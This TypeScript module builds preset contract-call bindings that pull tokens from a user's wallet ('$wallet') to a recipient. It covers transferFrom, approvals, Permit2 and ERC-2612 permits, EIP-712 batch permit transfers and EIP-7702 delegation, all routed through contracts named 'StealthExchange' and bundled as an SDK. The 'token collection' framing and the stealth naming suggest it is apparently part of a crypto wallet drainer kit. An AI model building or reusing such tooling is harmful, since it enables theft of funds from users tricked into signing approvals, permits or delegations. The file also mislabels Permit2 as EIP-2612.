import type { ContractFunctionBinding, StrategyMode } from '@/lib/types';
import { getContractById, getExecutionBackendEntry } from '@/lib/contract-registry';

/**
 * Strategy Preset Bindings
 *
 * Maps each strategy mode to:
 * 1. Primary execution contract & function
 * 2. Fallback function (if applicable)
 * 3. Required parameters
 * 4. ABI extraction from actual contracts
 */

export interface StrategyPreset {
  mode: StrategyMode;
  label: string;
  description: string;
  primaryBinding: ContractFunctionBinding;
  fallbackBinding?: ContractFunctionBinding;
  requiresApproval: boolean;
  requiresPermit: boolean;
  requiresEIP712: boolean;
}

export function getStrategyPresetBindings(strategy: {
  mode: StrategyMode;
  executionBackend: string;
}): StrategyPreset | null {
  switch (strategy.mode) {
    case 'permit2':
      return getPermit2Preset(strategy.executionBackend);
    case 'permit':
      return getPermitPreset(strategy.executionBackend);
    case 'multicall':
      return getMulticallPreset();
    case 'eip712':
      return getEIP712Preset(strategy.executionBackend);
    case 'eip7702':
      return getEIP7702Preset();
    case 'gasless':
      return getGaslessPreset(strategy.executionBackend);
    case 'direct':
      return getDirectPreset(strategy.executionBackend);
    case 'approve':
      return getApprovePreset(strategy.executionBackend);
    case 'trails':
      return getTrailsPreset();
    default:
      return null;
  }
}

function getDirectPreset(backend: string): StrategyPreset | null {
  const backend_entry = getExecutionBackendEntry('stealth-exchange');
  if (!backend_entry) return null;

  return {
    mode: 'direct',
    label: 'Direct Transfer',
    description: 'Direct token transfer without approval or permit',
    primaryBinding: {
      preset: 'direct',
      label: 'Direct Token Transfer',
      contractAddress: backend_entry.address,
      contractName: 'StealthExchange',
      abi: backend_entry.abi,
      functionKey: 'transferFrom(address,address,uint256)',
      functionName: 'transferFrom',
      stateMutability: 'nonpayable',
      args: [
        { name: 'from', type: 'address', value: '$wallet' },
        { name: 'to', type: 'address', value: '$recipient' },
        { name: 'amount', type: 'uint256', value: '0' },
      ],
    },
    requiresApproval: true,
    requiresPermit: false,
    requiresEIP712: false,
  };
}

function getApprovePreset(backend: string): StrategyPreset | null {
  const backend_entry = getExecutionBackendEntry('stealth-exchange');
  if (!backend_entry) return null;

  return {
    mode: 'approve',
    label: 'Approve + Transfer',
    description: 'Set approval then transfer tokens',
    primaryBinding: {
      preset: 'approve',
      label: 'Approve Spending',
      contractAddress: backend_entry.address,
      contractName: 'ERC20',
      abi: backend_entry.abi,
      functionKey: 'approve(address,uint256)',
      functionName: 'approve',
      stateMutability: 'nonpayable',
      args: [
        { name: 'spender', type: 'address', value: '$backend' },
        { name: 'amount', type: 'uint256', value: '0' },
      ],
    },
    fallbackBinding: {
      preset: 'approve-transfer',
      label: 'Transfer After Approval',
      contractAddress: backend_entry.address,
      contractName: 'ERC20',
      abi: backend_entry.abi,
      functionKey: 'transferFrom(address,address,uint256)',
      functionName: 'transferFrom',
      stateMutability: 'nonpayable',
      args: [
        { name: 'from', type: 'address', value: '$wallet' },
        { name: 'to', type: 'address', value: '$recipient' },
        { name: 'amount', type: 'uint256', value: '0' },
      ],
    },
    requiresApproval: true,
    requiresPermit: false,
    requiresEIP712: false,
  };
}

function getPermit2Preset(backend: string): StrategyPreset | null {
  const permit2_executor = getExecutionBackendEntry('permit2-executor');
  if (!permit2_executor) return null;

  return {
    mode: 'permit2',
    label: 'Permit2 (EIP-2612)',
    description: 'Use Permit2 for token collection without pre-approval',
    primaryBinding: {
      preset: 'permit2',
      label: 'Permit2 Pull',
      contractAddress: permit2_executor.address,
      contractName: 'Permit2Executor',
      abi: permit2_executor.abi,
      functionKey: 'pullBatchFromAllowance(address,address[],uint256[])',
      functionName: 'pullBatchFromAllowance',
      stateMutability: 'nonpayable',
      args: [
        { name: 'client', type: 'address', value: '$wallet' },
        { name: 'tokens', type: 'address[]', value: '[]' },
        { name: 'amounts', type: 'uint256[]', value: '[]' },
      ],
    },
    requiresApproval: false,
    requiresPermit: true,
    requiresEIP712: true,
  };
}

function getPermitPreset(backend: string): StrategyPreset | null {
  const erc2612_executor = getExecutionBackendEntry('erc2612-executor');
  if (!erc2612_executor) return null;

  return {
    mode: 'permit',
    label: 'ERC-2612 Permit',
    description: 'Use native ERC-2612 permit for token collection',
    primaryBinding: {
      preset: 'permit',
      label: 'ERC-2612 Permit & Collect',
      contractAddress: erc2612_executor.address,
      contractName: 'ERC2612Executor',
      abi: erc2612_executor.abi,
      functionKey: 'permitAndCollect(address,address,uint256,uint8,bytes32,bytes32)',
      functionName: 'permitAndCollect',
      stateMutability: 'nonpayable',
      args: [
        { name: 'token', type: 'address', value: '0x' },
        { name: 'client', type: 'address', value: '$wallet' },
        { name: 'amount', type: 'uint256', value: '0' },
        { name: 'v', type: 'uint8', value: '0' },
        { name: 'r', type: 'bytes32', value: '0x' },
        { name: 's', type: 'bytes32', value: '0x' },
      ],
    },
    requiresApproval: false,
    requiresPermit: true,
    requiresEIP712: true,
  };
}

function getMulticallPreset(): StrategyPreset | null {
  const multicall = getExecutionBackendEntry('batch-multicall');
  if (!multicall) return null;

  return {
    mode: 'multicall',
    label: 'Batch Multicall',
    description: 'Execute multiple calls in a single transaction',
    primaryBinding: {
      preset: 'multicall',
      label: 'Batch Multiple Calls',
      contractAddress: multicall.address,
      contractName: 'BatchMulticall',
      abi: multicall.abi,
      functionKey: 'batch((address,uint256,bytes,bool)[])',
      functionName: 'batch',
      stateMutability: 'payable',
      args: [
        {
          name: 'calls',
          type: 'tuple[]',
          value: '[]',
        },
      ],
    },
    requiresApproval: false,
    requiresPermit: false,
    requiresEIP712: false,
  };
}

function getEIP712Preset(backend: string): StrategyPreset | null {
  const stealth_exchange = getExecutionBackendEntry('stealth-exchange');
  if (!stealth_exchange) return null;

  return {
    mode: 'eip712',
    label: 'EIP-712 Typed Data',
    description: 'Use EIP-712 structured data signing',
    primaryBinding: {
      preset: 'eip712',
      label: 'EIP-712 Batch Permit Transfer',
      contractAddress: stealth_exchange.address,
      contractName: 'StealthExchange',
      abi: stealth_exchange.abi,
      functionKey: 'batchPermitTransferFromBatch(address,((address,uint160,uint48,uint48)[],address,uint256),bytes,address)',
      functionName: 'batchPermitTransferFromBatch',
      stateMutability: 'nonpayable',
      args: [
        { name: 'user', type: 'address', value: '$wallet' },
        { name: 'permitBatch', type: 'tuple', value: '{"details":[],"spender":"$recipient","sigDeadline":"0"}' },
        { name: 'signature', type: 'bytes', value: '0x' },
        { name: 'recipient', type: 'address', value: '$recipient' },
      ],
    },
    requiresApproval: false,
    requiresPermit: true,
    requiresEIP712: true,
  };
}

function getEIP7702Preset(): StrategyPreset | null {
  const eip7702 = getContractById('eip7702-batch-delegate');
  if (!eip7702 || !eip7702.abi) return null;

  return {
    mode: 'eip7702',
    label: 'EIP-7702 Delegation',
    description: 'Use EIP-7702 account delegation for gasless transactions',
    primaryBinding: {
      preset: 'eip7702',
      label: 'EIP-7702 Batch Delegate',
      contractAddress: eip7702.address || '0x0000000000000000000000000000000000000000',
      contractName: 'EIP7702BatchDelegate',
      abi: eip7702.abi,
      functionKey: 'executeBatch((address,uint256,bytes)[])',
      functionName: 'executeBatch',
      stateMutability: 'nonpayable',
      args: [
        {
          name: 'calls',
          type: 'tuple[]',
          value: '[]',
        },
      ],
    },
    requiresApproval: false,
    requiresPermit: false,
    requiresEIP712: false,
  };
}

function getGaslessPreset(backend: string): StrategyPreset | null {
  // Gasless uses a combination of strategies depending on configuration
  // Default to EIP-7702 if available, fall back to Permit2
  const eip7702Preset = getEIP7702Preset();
  if (eip7702Preset) {
    return {
      ...eip7702Preset,
      mode: 'gasless',
      label: 'Gasless (EIP-7702)',
      description: 'Gasless token collection via EIP-7702 delegation',
    };
  }

  return getPermit2Preset(backend);
}

function getTrailsPreset(): StrategyPreset | null {
  // Trails is a specialized routing protocol
  const stealth = getExecutionBackendEntry('stealth-exchange');
  if (!stealth) return null;

  return {
    mode: 'trails',
    label: 'Trails Routing',
    description: 'Use Trails protocol for optimal routing',
    primaryBinding: {
      preset: 'trails',
      label: 'Trails Route & Execute',
      contractAddress: stealth.address,
      contractName: 'StealthExchange',
      abi: stealth.abi,
      functionKey: 'routeAndExecute(bytes,address)',
      functionName: 'routeAndExecute',
      stateMutability: 'payable',
      args: [
        { name: 'routeData', type: 'bytes', value: '0x' },
        { name: 'recipient', type: 'address', value: '$recipient' },
      ],
    },
    requiresApproval: false,
    requiresPermit: false,
    requiresEIP712: false,
  };
}

/**
 * Get all strategy presets compiled into an SDK bundle
 */
export function compileAllStrategyPresets(): Record<StrategyMode, StrategyPreset | null> {
  const modes: StrategyMode[] = [
    'direct',
    'approve',
    'permit',
    'permit2',
    'multicall',
    'eip712',
    'eip7702',
    'gasless',
    'trails',
  ];

  const presets: Record<StrategyMode, StrategyPreset | null> = {} as any;

  for (const mode of modes) {
    presets[mode] = getStrategyPresetBindings({
      mode,
      executionBackend: 'stealth-exchange',
    });
  }

  return presets;
}
